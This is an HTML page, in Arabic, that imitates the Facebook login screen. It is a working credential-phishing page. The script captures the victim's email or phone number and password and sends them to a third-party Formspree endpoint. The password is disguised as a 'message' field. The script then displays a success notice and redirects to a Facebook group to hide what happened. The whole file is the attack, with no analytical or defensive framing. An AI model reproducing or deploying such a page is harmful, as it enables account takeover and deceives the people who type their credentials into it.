<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Facebook - تسجيل الدخول</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      margin: 0;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }

    .logo {
      font-size: 50px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .form-box {
      background-color: white;
      padding: 20px;
      border-radius: 10px;
      width: 350px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

    .form-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
    }

    .form-box button {
      width: 100%;
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
    }

    .form-box button:hover {
      background-color: #165ecf;
    }

    .message {
      margin-top: 15px;
      font-size: 14px;
      color: red;
    }

    .message.success {
      color: green;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">Facebook</div>

    <div class="form-box">
      <form id="loginForm">
        <input type="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" name="message" placeholder="كلمة المرور" required>
        <button type="submit">تسجيل الدخول</button>
      </form>
      <div class="message" id="formMessage"></div>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const messageBox = document.getElementById("formMessage");

    form.addEventListener("submit", async function(e) {
      e.preventDefault();

      const formData = new FormData(form);

      try {
        const response = await fetch("https://formspree.io/f/mqapjodg", {
          method: "POST",
          body: formData,
          headers: {
            'Accept': 'application/json'
          }
        });

        if (response.ok) {
          messageBox.textContent = "تم الإرسال بنجاح!";
          messageBox.classList.add("success");
          form.reset();

          // إعادة التوجيه بعد ثانية واحدة
          setTimeout(() => {
            window.location.href = 'https://facebook.com/groups/547132448088903/';
          }, 1000);
        } else {
          messageBox.textContent = "حدث خطأ أثناء الإرسال.";
          messageBox.classList.remove("success");
        }
      } catch (error) {
        messageBox.textContent = "فشل الاتصال بالخادم.";
        messageBox.classList.remove("success");
      }
    });
  </script>

</body>
</html>
